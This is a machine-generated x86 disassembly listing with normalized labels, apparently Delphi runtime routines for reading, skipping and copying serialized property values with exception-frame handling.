lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d968
mov eax [ ebp - 0x1c ]
call sub_417800
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d4fc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4030bc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417550
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d7bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405e88
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41814c
xor eax eax
push ebp
push sub_41d79b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418304
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7a2
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403174
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4182a8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d7ec
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039a4
jmp r-xdata
call sub_403950
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b8f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d85c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d81b
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41ba98
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403950
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d85c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403174
sub_41d888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d932
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d905
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db44
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414618
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41bbe0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41bc18
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d939
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d968
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c108
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fdc
mov eax esi
call j_sub_4043b8
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c108
pop edx
pop esi
pop ebx
retn
sub_41d9a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41da51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c0e4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41da60
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404174
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da58
lea eax [ ebp - 0x8 ]
call sub_4045cc
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41db44
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c108
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404538
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c108
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c108
jmp r-xdata
jmp r-xdata
call sub_41bbe0
sub_41da60
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41db37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c0e4
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d9a4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404718
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db3e
lea eax [ ebp - 0xc ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41db44
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c108
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404814
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c108
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c108
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404538
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c108
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405b28
jmp r-xdata
jmp r-xdata
call sub_41bbe0
sub_41db58
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41db94
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d968
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db9b
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41dba0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bda0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41dc54
mov eax [ ebx ]
call sub_41cd0c
pop ebx
pop ebp
retn
sub_41dbc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c108
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e04c
pop ebx
pop ecx
pop ebp
retn
sub_41dbf8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bda0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c0e4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41cd0c
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e04c
jmp r-xdata
mov eax [ ebx ]
call sub_41dc54
mov eax [ ebx ]
call sub_41bda0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41ddf0
mov eax [ ebx ]
call sub_41cd0c
sub_41dc54
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dde3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db44
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ddea
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
jmp [ eax * 4 + jump_table_41dc8b ]
push ebp
call sub_41dba0
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d968
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbc8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbc8
pop ecx
jmp r-xdata
push ebp
call sub_41dbf8
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
push ebp
mov eax 0x2
call sub_41dbc8
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e04c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41dbc8
pop ecx
sub_41ddf0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41de2d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d968
mov eax ebx
call sub_41dc54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de34
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41de38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41ded0
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41bda0
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d968
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d968
jmp r-xdata
mov eax ebx
call sub_41ddf0
mov eax ebx
call sub_41cd0c
jmp r-xdata
mov eax ebx
call sub_41bda0
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41de38
mov eax ebx
call sub_41cd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ded7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
sub_41dee0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41df85
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f84
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420ed0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df8c
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
sub_41dfb0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41dfd8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c038
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417740
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403388
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c038
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e04c
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c108
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c108
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e094
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e23d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41bc6c
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e218
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c108
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41ab48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c108
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e1f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d9a4
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c108
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41ab48
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c108
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4142a0
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
lea eax [ ebp - 0x1c ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d020
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1fa
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_41e25c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e456
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ecd4
mov eax [ ebp - 0x4 ]
call sub_41c0e4
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
jmp [ eax * 4 + jump_table_41e29e ]
mov eax [ ebp - 0x4 ]
call sub_41db44
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc54
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412e64
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc54
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412e64
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc54
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412e64
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca38
mov eax ebx
call sub_41305c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca7c
mov eax ebx
call sub_41305c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cac0
mov eax ebx
call sub_413084
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb10
mov eax ebx
call sub_413070
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d9a4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413098
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41da60
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4130c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db44
cmp al 0x9
sete dl
mov eax ebx
call sub_413034
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e094
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40effc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ccc0
push edx
push eax
mov eax ebx
call sub_412f60
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e45d
lea eax [ ebp - 0x1c ]
call sub_40ece8
lea eax [ ebp - 0xc ]
call sub_4045cc
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov eax ebx
call sub_414388
jmp r-xdata
sub_41e464
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_41e630
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b570
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41e49c
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420540
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e4c4
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420540
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e5a8
sub_41e508
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aac4
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e630
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41aae4
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e55c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e630
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e5a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e61f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_42077c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e55c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e626
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_41e65c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e69f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040d4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6a6
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41e6ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e73e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_42077c
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ef18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e745
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4192e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41ef10
mov edx esi
mov eax edi
call sub_4192ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ef64
mov eax [ ebp - 0x4 ]
call sub_41ef18
inc esi
dec ebx
jne r-xdata
sub_41e74c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4182a8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407db4
test al al
jne r-xdata
sub_41e79c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e8e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_420fec
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e74c
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420fc0
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_420fec
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420fc0
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8ea
mov eax [ ebp - 0x4 ]
